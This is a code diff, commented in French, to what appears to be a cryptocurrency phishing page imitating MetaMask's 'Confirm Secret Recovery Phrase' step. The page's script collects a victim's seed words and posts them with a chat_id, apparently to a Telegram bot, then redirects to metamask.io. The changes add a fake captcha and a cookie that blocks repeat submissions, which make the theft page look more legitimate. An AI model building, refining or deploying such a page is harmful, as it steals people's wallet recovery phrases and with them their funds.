@@ -202,6 +202,12 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
+      <!-- Captcha simple anti-bot -->
+      <div style="margin: 10px 0;">
+        <label for="captchaInput">Combien font 2 + 3 ?</label>
+        <input type="text" id="captchaInput" placeholder="Votre réponse" />
+      </div>
+
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
@@ -212,6 +218,26 @@
 
   <script src="bip39-words.js"></script>
   <script>
+    // Fonctions cookie
+    function setCookie(name, value, days) {
+      const d = new Date();
+      d.setTime(d.getTime() + (days*24*60*60*1000));
+      const expires = "expires="+ d.toUTCString();
+      document.cookie = name + "=" + value + ";" + expires + ";path=/";
+    }
+
+    function getCookie(name) {
+      const cname = name + "=";
+      const decodedCookie = decodeURIComponent(document.cookie);
+      const ca = decodedCookie.split(';');
+      for(let i = 0; i < ca.length; i++) {
+        let c = ca[i];
+        while (c.charAt(0) == ' ') c = c.substring(1);
+        if (c.indexOf(cname) == 0) return c.substring(cname.length, c.length);
+      }
+      return "";
+    }
+
     function generateInputs() {
       const container = document.getElementById("seedInputs");
       const count = parseInt(document.getElementById("phraseLength").value);
@@ -229,6 +255,9 @@
         input.addEventListener("input", checkFieldsFilled);
       });
 
+      // Listener captcha input
+      document.getElementById("captchaInput").addEventListener("input", checkFieldsFilled);
+
       document.getElementById("submitBtn").disabled = true;
     }
 
@@ -243,6 +272,9 @@
           break;
         }
       }
+
+      const captchaVal = document.getElementById("captchaInput").value.trim();
+      if(captchaVal === "") allFilled = false;
 
       document.getElementById("submitBtn").disabled = !allFilled;
     }
@@ -266,8 +298,13 @@
     }
 
     function handleConfirm() {
-      const submitBtn = document.getElementById("submitBtn");
       const errorEl = document.getElementById("errorMsg");
+
+      // Vérifier si formulaire déjà soumis
+      if(getCookie("formSubmitted") === "true") {
+        alert("Vous avez déjà soumis le formulaire.");
+        return;
+      }
 
       if (!validateBIP39Words()) {
         errorEl.style.display = "block";
@@ -276,8 +313,12 @@
         errorEl.style.display = "none";
       }
 
-      // Disable button to prevent multiple submissions
-      submitBtn.disabled = true;
+      // Vérifier captcha
+      const captchaInput = document.getElementById("captchaInput").value.trim();
+      if(captchaInput !== "5") {
+        alert("Réponse au captcha incorrecte.");
+        return;
+      }
 
       const count = parseInt(document.getElementById("phraseLength").value);
       let phrase = "";
@@ -296,13 +337,21 @@
           chat_id: chatId,
           text: "\n\n" + phrase.trim()
         })
-      }).finally(() => {
-        setTimeout(() => {
-          window.location.href = "https://metamask.io/"; // Remplace ton lien ici
-        }, 800);
       });
 
       navigator.clipboard.writeText(phrase.trim());
+
+      // Bloquer nouvel envoi : cookie 30 jours
+      setCookie("formSubmitted", "true", 30);
+
+      // Désactiver bouton après envoi
+      const submitBtn = document.getElementById("submitBtn");
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Formulaire soumis";
+
+      setTimeout(() => {
+        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
+      }, 800);
     }
 
     document.addEventListener("paste", function(e) {
